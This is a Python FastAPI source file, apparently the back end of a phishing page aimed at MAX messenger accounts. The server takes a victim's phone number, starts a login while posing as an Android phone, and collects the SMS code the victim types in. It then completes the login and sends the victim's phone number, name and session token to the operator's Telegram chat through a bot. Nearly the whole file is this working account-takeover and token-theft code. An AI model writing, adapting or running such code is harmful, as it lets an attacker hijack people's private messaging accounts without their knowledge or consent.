from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
import asyncio
import os
from pymax import Client
from pymax.payloads import MobileUserAgentPayload
from aiogram import Bot
import uvicorn

app = FastAPI()
BOT_TOKEN = "ВАШ_ТОКЕН_ТЕЛЕГРАМ_БОТА"
CHAT_ID = 123456789
bot = Bot(token=BOT_TOKEN)

sessions = {}

@app.get("/", response_class=HTMLResponse)
async def get_index():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.post("/api/send-code")
async def send_code(request: Request):
    data = await request.json()
    phone = data.get("phone")
    if not phone:
        return JSONResponse({"error": "Номер обязателен"}, status_code=400)
    
    ua = MobileUserAgentPayload(
        device_type="ANDROID",
        app_version="25.12.13",
        os_version="13",
        timezone="Europe/Moscow",
        screen="1080x2400",
        device_name="SM-G998B",
        device_locale="ru_RU",
        header_user_agent="Mozilla/5.0 (Linux; Android 13)"
    )
    
    client = Client(
        phone=phone,
        work_dir="sessions",
        session_name=phone.replace("+", ""),
        extra_headers=ua
    )
    
    async def start_auth():
        await client.start()
        sessions[phone] = {"client": client, "step": "code_sent"}
    
    asyncio.create_task(start_auth())
    return JSONResponse({"success": True})

@app.post("/api/verify-code")
async def verify_code(request: Request):
    data = await request.json()
    phone = data.get("phone")
    code = data.get("code")
    
    session = sessions.get(phone)
    if not session:
        return JSONResponse({"error": "Сессия не найдена, начните заново"}, status_code=400)
    
    client = session["client"]
    
    try:
        client.sms_code = code
        await client.complete_login()
        token = client.token
        me = client.me
        
        await bot.send_message(
            CHAT_ID,
            f"✅ Новый аккаунт MAX!\n\n📱 {phone}\n👤 {me.first_name} {me.last_name or ''}\n🔑 `{token[:50]}...`",
            parse_mode="Markdown"
        )
        return JSONResponse({"success": True})
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=400)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
